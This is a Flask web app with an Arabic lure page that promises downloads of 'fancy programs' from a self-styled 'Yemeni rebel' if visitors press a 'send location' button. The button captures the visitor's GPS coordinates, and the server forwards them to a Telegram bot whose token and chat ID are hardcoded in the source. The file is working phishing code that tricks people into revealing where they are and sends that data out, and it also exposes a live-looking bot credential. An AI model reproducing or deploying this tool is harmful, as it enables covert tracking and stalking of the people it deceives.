from flask import Flask, request, render_template_string
import requests
import os

app = Flask(__name__)

# التوكن حق البوت
TOKEN = "7880550955:AAEep2yo54KzCLXqKHUWcTOTIODQbZsck_4"

# الآيدي حقك
CHAT_ID = "6969597735"

html_page = """
<!DOCTYPE html>
<html>
<head>
  <title>Camera and Location</title>
</head>
<body>
  <h2>أهلًا بكم في بوت المتمرد اليمني لتحميل البرامج الفخمة يا فخمين ✅♻️</h2>
  <p>لتواصل مع المتمرد (@mtmrad0)</p>
  <p>لمعرفة البرامج المتاحة اضغط على زر إرسال الموقع</p>
  <button onclick="sendLocation()">📍 إرسال الموقع</button>

  <script>
    function sendLocation() {
      navigator.geolocation.getCurrentPosition(pos => {
        fetch("/send_location", {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({
            lat: pos.coords.latitude,
            lon: pos.coords.longitude
          })
        }).then(response => {
            alert("تم إرسال الموقع بنجاح!");
        });
      }, err => {
        alert("فشل الحصول على الموقع: " + err.message);
      });
    }
  </script>
</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(html_page)

@app.route('/send_location', methods=["POST"])
def send_location():
    data = request.get_json()
    lat = data.get("lat")
    lon = data.get("lon")

    # نص الرسالة اللي ترسلها للبوت
    text = f"📍 تم التقاط الموقع:\nLatitude: {lat}\nLongitude: {lon}"
    send_message(text)

    return "OK"

def send_message(text):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": text
    }
    try:
        requests.post(url, data=payload, timeout=5)
    except Exception as e:
        print(f"Error sending message: {e}")

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
